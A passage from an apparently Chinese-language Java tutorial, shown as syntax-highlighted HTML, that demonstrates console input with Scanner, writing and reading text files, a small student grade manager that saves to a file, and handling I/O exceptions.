        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);
        
        <span class="hljs-comment">// 1. 读取字符串</span>
        System.out.print(<span class="hljs-string">"请输入你的名字: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> scanner.nextLine();  <span class="hljs-comment">// 读取整行</span>
        System.out.println(<span class="hljs-string">"你好，"</span> + name + <span class="hljs-string">"！"</span>);
        
        <span class="hljs-comment">// 2. 读取整数</span>
        System.out.print(<span class="hljs-string">"请输入你的年龄: "</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> scanner.nextInt();  <span class="hljs-comment">// 读取整数</span>
        System.out.println(<span class="hljs-string">"你今年"</span> + age + <span class="hljs-string">"岁"</span>);
        
        <span class="hljs-comment">// 3. 读取小数</span>
        System.out.print(<span class="hljs-string">"请输入你的身高(米): "</span>);
        <span class="hljs-type">double</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> scanner.nextDouble();  <span class="hljs-comment">// 读取小数</span>
        System.out.println(<span class="hljs-string">"你的身高是"</span> + height + <span class="hljs-string">"米"</span>);
        
        <span class="hljs-comment">// 4. 读取单词（空格分隔）</span>
        System.out.print(<span class="hljs-string">"请输入三个你喜欢的颜色（用空格分开）: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">color1</span> <span class="hljs-operator">=</span> scanner.next();  <span class="hljs-comment">// 读取第一个单词</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">color2</span> <span class="hljs-operator">=</span> scanner.next();  <span class="hljs-comment">// 读取第二个单词</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">color3</span> <span class="hljs-operator">=</span> scanner.next();  <span class="hljs-comment">// 读取第三个单词</span>
        System.out.println(<span class="hljs-string">"你喜欢的颜色是: "</span> + color1 + <span class="hljs-string">", "</span> + color2 + <span class="hljs-string">", "</span> + color3);
        
        <span class="hljs-comment">// 注意：nextInt/nextDouble后如果要读取字符串，需要先消耗换行符</span>
        scanner.nextLine();  <span class="hljs-comment">// 消耗掉nextDouble留下的换行符</span>
        
        <span class="hljs-comment">// 5. 读取布尔值</span>
        System.out.print(<span class="hljs-string">"你喜欢Java吗？(true/false): "</span>);
        <span class="hljs-type">boolean</span> <span class="hljs-variable">likeJava</span> <span class="hljs-operator">=</span> scanner.nextBoolean();
        <span class="hljs-keyword">if</span> (likeJava) {
            System.out.println(<span class="hljs-string">"太好了！让我们一起学好Java！"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"Java其实很有趣，再试试看！"</span>);
        }
        
        <span class="hljs-comment">// 6. 读取单个字符</span>
        System.out.print(<span class="hljs-string">"请输入一个字符: "</span>);
        <span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> scanner.next().charAt(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 读取第一个字符</span>
        System.out.println(<span class="hljs-string">"你输入的字符是: '"</span> + ch + <span class="hljs-string">"'"</span>);
        
        <span class="hljs-comment">// 关闭Scanner（好习惯）</span>
        scanner.close();
    }
}
</code></pre>
<h3 data-id="heading-3">1.3 综合示例：用户注册系统</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">import</span> java.util.Scanner;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRegistration</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 用户注册系统 ==="</span>);
        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);
        
        <span class="hljs-comment">// 收集用户信息</span>
        System.out.print(<span class="hljs-string">"请输入用户名: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> scanner.nextLine();
        
        System.out.print(<span class="hljs-string">"请输入密码: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> scanner.nextLine();
        
        System.out.print(<span class="hljs-string">"请输入年龄: "</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> scanner.nextInt();
        scanner.nextLine();  <span class="hljs-comment">// 消耗换行符</span>
        
        System.out.print(<span class="hljs-string">"请输入邮箱: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">email</span> <span class="hljs-operator">=</span> scanner.nextLine();
        
        System.out.print(<span class="hljs-string">"请输入手机号: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> scanner.nextLine();
        
        <span class="hljs-comment">// 显示注册信息</span>
        System.out.println(<span class="hljs-string">"\n=== 注册信息确认 ==="</span>);
        System.out.printf(<span class="hljs-string">"%-10s: %s\n"</span>, <span class="hljs-string">"用户名"</span>, username);
        System.out.printf(<span class="hljs-string">"%-10s: %s\n"</span>, <span class="hljs-string">"密码"</span>, <span class="hljs-string">"******"</span>);  <span class="hljs-comment">// 隐藏密码</span>
        System.out.printf(<span class="hljs-string">"%-10s: %d\n"</span>, <span class="hljs-string">"年龄"</span>, age);
        System.out.printf(<span class="hljs-string">"%-10s: %s\n"</span>, <span class="hljs-string">"邮箱"</span>, email);
        System.out.printf(<span class="hljs-string">"%-10s: %s\n"</span>, <span class="hljs-string">"手机号"</span>, phone);
        
        <span class="hljs-comment">// 验证确认</span>
        System.out.print(<span class="hljs-string">"\n确认注册吗？(y/n): "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">confirm</span> <span class="hljs-operator">=</span> scanner.next();
        
        <span class="hljs-keyword">if</span> (confirm.equalsIgnoreCase(<span class="hljs-string">"y"</span>)) {
            System.out.println(<span class="hljs-string">"注册成功！欢迎，"</span> + username + <span class="hljs-string">"！"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"注册已取消。"</span>);
        }
        
        scanner.close();
    }
}
</code></pre>
<h2 data-id="heading-4">2.文件操作：让程序有"记忆力"</h2>
<h3 data-id="heading-5">2.1 写入文件：保存数据</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">import</span> java.io.FileWriter;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.PrintWriter;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WriteToFile</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 写入文件 ==="</span>);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. 使用FileWriter写入文件（会覆盖原有内容）</span>
            <span class="hljs-type">FileWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">"student.txt"</span>);
            
            writer.write(<span class="hljs-string">"=== 学生信息 ===\n"</span>);
            writer.write(<span class="hljs-string">"姓名: 张三\n"</span>);
            writer.write(<span class="hljs-string">"年龄: 20\n"</span>);
            writer.write(<span class="hljs-string">"成绩: 95.5\n"</span>);
            
            writer.close();  <span class="hljs-comment">// 一定要关闭文件！</span>
            System.out.println(<span class="hljs-string">"文件写入成功！"</span>);
            
            <span class="hljs-comment">// 2. 追加内容到文件（不覆盖原有内容）</span>
            <span class="hljs-type">FileWriter</span> <span class="hljs-variable">appendWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">"student.txt"</span>, <span class="hljs-literal">true</span>);  <span class="hljs-comment">// true表示追加模式</span>
            
            appendWriter.write(<span class="hljs-string">"-----------------\n"</span>);
            appendWriter.write(<span class="hljs-string">"姓名: 李四\n"</span>);
            appendWriter.write(<span class="hljs-string">"年龄: 22\n"</span>);
            appendWriter.write(<span class="hljs-string">"成绩: 88.0\n"</span>);
            
            appendWriter.close();
            System.out.println(<span class="hljs-string">"追加内容成功！"</span>);
            
            <span class="hljs-comment">// 3. 使用PrintWriter（更方便的写入方式）</span>
            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(<span class="hljs-string">"course.txt"</span>);
            
            printWriter.println(<span class="hljs-string">"=== 课程列表 ==="</span>);
            printWriter.printf(<span class="hljs-string">"%-15s %-10s %-10s\n"</span>, <span class="hljs-string">"课程名"</span>, <span class="hljs-string">"学分"</span>, <span class="hljs-string">"课时"</span>);
            printWriter.printf(<span class="hljs-string">"%-15s %-10d %-10d\n"</span>, <span class="hljs-string">"Java编程"</span>, <span class="hljs-number">3</span>, <span class="hljs-number">48</span>);
            printWriter.printf(<span class="hljs-string">"%-15s %-10d %-10d\n"</span>, <span class="hljs-string">"数据结构"</span>, <span class="hljs-number">4</span>, <span class="hljs-number">64</span>);
            printWriter.printf(<span class="hljs-string">"%-15s %-10d %-10d\n"</span>, <span class="hljs-string">"数据库原理"</span>, <span class="hljs-number">3</span>, <span class="hljs-number">48</span>);
            
            printWriter.close();
            System.out.println(<span class="hljs-string">"课程文件写入成功！"</span>);
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"写入文件时出错: "</span> + e.getMessage());
        }
    }
}
</code></pre>
<h3 data-id="heading-6">2.2 读取文件：读取数据</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">import</span> java.io.BufferedReader;
<span class="hljs-keyword">import</span> java.io.FileReader;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.Scanner;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReadFromFile</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 读取文件 ==="</span>);
        
        <span class="hljs-comment">// 方法1：使用BufferedReader（适合读取文本文件）</span>
        System.out.println(<span class="hljs-string">"\n方法1：使用BufferedReader"</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"student.txt"</span>));
            
            String line;
            System.out.println(<span class="hljs-string">"文件内容："</span>);
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                System.out.println(line);
            }
            
            reader.close();
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"读取文件时出错: "</span> + e.getMessage());
        }
        
        <span class="hljs-comment">// 方法2：使用Scanner（更方便，功能更强大）</span>
        System.out.println(<span class="hljs-string">"\n方法2：使用Scanner"</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Scanner</span> <span class="hljs-variable">fileScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">"student.txt"</span>));
            
            System.out.println(<span class="hljs-string">"逐行读取："</span>);
            <span class="hljs-type">int</span> <span class="hljs-variable">lineNumber</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
            <span class="hljs-keyword">while</span> (fileScanner.hasNextLine()) {
                <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> fileScanner.nextLine();
                System.out.println(<span class="hljs-string">"第"</span> + lineNumber + <span class="hljs-string">"行: "</span> + line);
                lineNumber++;
            }
            
            fileScanner.close();
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"读取文件时出错: "</span> + e.getMessage());
        }
        
        <span class="hljs-comment">// 方法3：读取特定格式的数据</span>
        System.out.println(<span class="hljs-string">"\n方法3：读取结构化数据"</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Scanner</span> <span class="hljs-variable">dataScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">"course.txt"</span>));
            
            <span class="hljs-comment">// 跳过标题行</span>
            <span class="hljs-keyword">if</span> (dataScanner.hasNextLine()) {
                dataScanner.nextLine();  <span class="hljs-comment">// 跳过"=== 课程列表 ==="</span>
                dataScanner.nextLine();  <span class="hljs-comment">// 跳过表头</span>
            }
            
            System.out.println(<span class="hljs-string">"课程信息："</span>);
            <span class="hljs-keyword">while</span> (dataScanner.hasNextLine()) {
                <span class="hljs-type">String</span> <span class="hljs-variable">courseName</span> <span class="hljs-operator">=</span> dataScanner.next();
                <span class="hljs-type">int</span> <span class="hljs-variable">credit</span> <span class="hljs-operator">=</span> dataScanner.nextInt();
                <span class="hljs-type">int</span> <span class="hljs-variable">hours</span> <span class="hljs-operator">=</span> dataScanner.nextInt();
                
                System.out.printf(<span class="hljs-string">"课程: %s, 学分: %d, 课时: %d\n"</span>, 
                                 courseName, credit, hours);
            }
            
            dataScanner.close();
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"读取文件时出错: "</span> + e.getMessage());
        }
    }
}
</code></pre>
<h3 data-id="heading-7">2.3 综合示例：学生成绩管理系统</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.util.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentGradeManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">"students.dat"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 学生成绩管理系统 ==="</span>);
        
        <span class="hljs-type">boolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">while</span> (running) {
            System.out.println(<span class="hljs-string">"\n请选择操作："</span>);
            System.out.println(<span class="hljs-string">"1. 添加学生"</span>);
            System.out.println(<span class="hljs-string">"2. 查看所有学生"</span>);
            System.out.println(<span class="hljs-string">"3. 查找学生"</span>);
            System.out.println(<span class="hljs-string">"4. 保存到文件"</span>);
            System.out.println(<span class="hljs-string">"5. 从文件加载"</span>);
            System.out.println(<span class="hljs-string">"6. 退出"</span>);
            System.out.print(<span class="hljs-string">"请输入选择 (1-6): "</span>);
            
            <span class="hljs-type">int</span> <span class="hljs-variable">choice</span> <span class="hljs-operator">=</span> scanner.nextInt();
            scanner.nextLine();  <span class="hljs-comment">// 消耗换行符</span>
            
            <span class="hljs-keyword">switch</span> (choice) {
                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                    addStudent();
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                    viewAllStudents();
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
                    findStudent();
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
                    saveToFile();
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
                    loadFromFile();
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:
                    running = <span class="hljs-literal">false</span>;
                    System.out.println(<span class="hljs-string">"谢谢使用！再见！"</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">default</span>:
                    System.out.println(<span class="hljs-string">"无效选择，请重新输入！"</span>);
            }
        }
        
        scanner.close();
    }
    
    <span class="hljs-comment">// 存储学生列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Student&gt; students = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-comment">// 添加学生</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addStudent</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"\n=== 添加学生 ==="</span>);
        
        System.out.print(<span class="hljs-string">"请输入学号: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> scanner.nextLine();
        
        System.out.print(<span class="hljs-string">"请输入姓名: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> scanner.nextLine();
        
        System.out.print(<span class="hljs-string">"请输入年龄: "</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> scanner.nextInt();
        
        System.out.print(<span class="hljs-string">"请输入Java成绩: "</span>);
        <span class="hljs-type">double</span> <span class="hljs-variable">javaScore</span> <span class="hljs-operator">=</span> scanner.nextDouble();
        
        System.out.print(<span class="hljs-string">"请输入数学成绩: "</span>);
        <span class="hljs-type">double</span> <span class="hljs-variable">mathScore</span> <span class="hljs-operator">=</span> scanner.nextDouble();
        
        scanner.nextLine();  <span class="hljs-comment">// 消耗换行符</span>
        
        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(id, name, age, javaScore, mathScore);
        students.add(student);
        
        System.out.println(<span class="hljs-string">"学生添加成功！"</span>);
    }
    
    <span class="hljs-comment">// 查看所有学生</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">viewAllStudents</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"\n=== 所有学生信息 ==="</span>);
        
        <span class="hljs-keyword">if</span> (students.isEmpty()) {
            System.out.println(<span class="hljs-string">"暂无学生信息！"</span>);
            <span class="hljs-keyword">return</span>;
        }
        
        System.out.printf(<span class="hljs-string">"%-10s %-10s %-5s %-10s %-10s %-10s\n"</span>, 
                         <span class="hljs-string">"学号"</span>, <span class="hljs-string">"姓名"</span>, <span class="hljs-string">"年龄"</span>, <span class="hljs-string">"Java成绩"</span>, <span class="hljs-string">"数学成绩"</span>, <span class="hljs-string">"平均分"</span>);
        System.out.println(<span class="hljs-string">"-"</span>.repeat(<span class="hljs-number">65</span>));
        
        <span class="hljs-keyword">for</span> (Student student : students) {
            System.out.printf(<span class="hljs-string">"%-10s %-10s %-5d %-10.2f %-10.2f %-10.2f\n"</span>,
                            student.getId(),
                            student.getName(),
                            student.getAge(),
                            student.getJavaScore(),
                            student.getMathScore(),
                            student.getAverage());
        }
    }
    
    <span class="hljs-comment">// 查找学生</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findStudent</span><span class="hljs-params">()</span> {
        System.out.print(<span class="hljs-string">"\n请输入要查找的学生学号: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">searchId</span> <span class="hljs-operator">=</span> scanner.nextLine();
        
        <span class="hljs-type">boolean</span> <span class="hljs-variable">found</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (Student student : students) {
            <span class="hljs-keyword">if</span> (student.getId().equals(searchId)) {
                System.out.println(<span class="hljs-string">"找到学生："</span>);
                System.out.println(student);
                found = <span class="hljs-literal">true</span>;
                <span class="hljs-keyword">break</span>;
            }
        }
        
        <span class="hljs-keyword">if</span> (!found) {
            System.out.println(<span class="hljs-string">"未找到学号为 "</span> + searchId + <span class="hljs-string">" 的学生！"</span>);
        }
    }
    
    <span class="hljs-comment">// 保存到文件</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveToFile</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(FILE_NAME))) {
            <span class="hljs-comment">// 写入学生数量</span>
            writer.println(students.size());
            
            <span class="hljs-comment">// 写入每个学生的信息</span>
            <span class="hljs-keyword">for</span> (Student student : students) {
                writer.println(student.getId());
                writer.println(student.getName());
                writer.println(student.getAge());
                writer.println(student.getJavaScore());
                writer.println(student.getMathScore());
            }
            
            System.out.println(<span class="hljs-string">"数据已保存到文件: "</span> + FILE_NAME);
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"保存文件时出错: "</span> + e.getMessage());
        }
    }
    
    <span class="hljs-comment">// 从文件加载</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadFromFile</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">Scanner</span> <span class="hljs-variable">fileScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(FILE_NAME))) {
            <span class="hljs-comment">// 清空当前学生列表</span>
            students.clear();
            
            <span class="hljs-comment">// 读取学生数量</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> Integer.parseInt(fileScanner.nextLine());
            
            <span class="hljs-comment">// 读取每个学生的信息</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {
                <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> fileScanner.nextLine();
                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> fileScanner.nextLine();
                <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> Integer.parseInt(fileScanner.nextLine());
                <span class="hljs-type">double</span> <span class="hljs-variable">javaScore</span> <span class="hljs-operator">=</span> Double.parseDouble(fileScanner.nextLine());
                <span class="hljs-type">double</span> <span class="hljs-variable">mathScore</span> <span class="hljs-operator">=</span> Double.parseDouble(fileScanner.nextLine());
                
                students.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(id, name, age, javaScore, mathScore));
            }
            
            System.out.println(<span class="hljs-string">"从文件加载了 "</span> + count + <span class="hljs-string">" 个学生信息！"</span>);
            
        } <span class="hljs-keyword">catch</span> (FileNotFoundException e) {
            System.out.println(<span class="hljs-string">"文件不存在，请先保存数据！"</span>);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"读取文件时出错: "</span> + e.getMessage());
        }
    }
}

<span class="hljs-comment">// 学生类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-keyword">private</span> String id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> javaScore;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> mathScore;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String id, String name, <span class="hljs-type">int</span> age, <span class="hljs-type">double</span> javaScore, <span class="hljs-type">double</span> mathScore)</span> {
        <span class="hljs-built_in">this</span>.id = id;
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
        <span class="hljs-built_in">this</span>.javaScore = javaScore;
        <span class="hljs-built_in">this</span>.mathScore = mathScore;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getAverage</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> (javaScore + mathScore) / <span class="hljs-number">2</span>;
    }
    
    <span class="hljs-comment">// Getter方法</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> id; }
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> name; }
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> age; }
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getJavaScore</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> javaScore; }
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getMathScore</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> mathScore; }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"学号: %s, 姓名: %s, 年龄: %d\n"</span> +
                           <span class="hljs-string">"Java成绩: %.2f, 数学成绩: %.2f, 平均分: %.2f"</span>,
                           id, name, age, javaScore, mathScore, getAverage());
    }
}
</code></pre>
<h2 data-id="heading-8">3.异常处理：I/O操作中的"安全网"</h2>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.util.Scanner;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IOExceptionHandling</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== I/O异常处理 ==="</span>);
        
        <span class="hljs-comment">// 1. 文件不存在的异常处理</span>
        System.out.println(<span class="hljs-string">"\n1. 尝试读取不存在的文件："</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Scanner</span> <span class="hljs-variable">fileScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"不存在.txt"</span>));
            System.out.println(<span class="hljs-string">"文件内容："</span> + fileScanner.nextLine());
            fileScanner.close();
        } <span class="hljs-keyword">catch</span> (FileNotFoundException e) {
            System.out.println(<span class="hljs-string">"错误：文件不存在！"</span>);
            System.out.println(<span class="hljs-string">"建议：检查文件路径是否正确"</span>);
        }
        
        <span class="hljs-comment">// 2. 写入文件时的异常处理</span>
        System.out.println(<span class="hljs-string">"\n2. 写入文件时的异常："</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">FileWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">"/只读目录/test.txt"</span>);
            writer.write(<span class="hljs-string">"测试内容"</span>);
            writer.close();
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"错误：写入文件失败！"</span>);
            System.out.println(<span class="hljs-string">"原因："</span> + e.getMessage());
            System.out.println(<span class="hljs-string">"建议：检查是否有写入权限"</span>);
        }
        
        <span class="hljs-comment">// 3. 读取文件时的格式错误</span>
        System.out.println(<span class="hljs-string">"\n3. 读取格式错误的文件："</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"格式错误.txt"</span>));
            <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> scanner.nextInt();  <span class="hljs-comment">// 如果文件内容不是数字会出错</span>
            System.out.println(<span class="hljs-string">"读取的数字："</span> + number);
            scanner.close();
        } <span class="hljs-keyword">catch</span> (FileNotFoundException e) {
            System.out.println(<span class="hljs-string">"错误：文件不存在"</span>);
        } <span class="hljs-keyword">catch</span> (java.util.InputMismatchException e) {
            System.out.println(<span class="hljs-string">"错误：文件内容格式不正确！"</span>);
            System.out.println(<span class="hljs-string">"建议：检查文件内容是否为数字"</span>);
        }
        
        <span class="hljs-comment">// 4. 使用try-with-resources自动关闭资源（推荐！）</span>
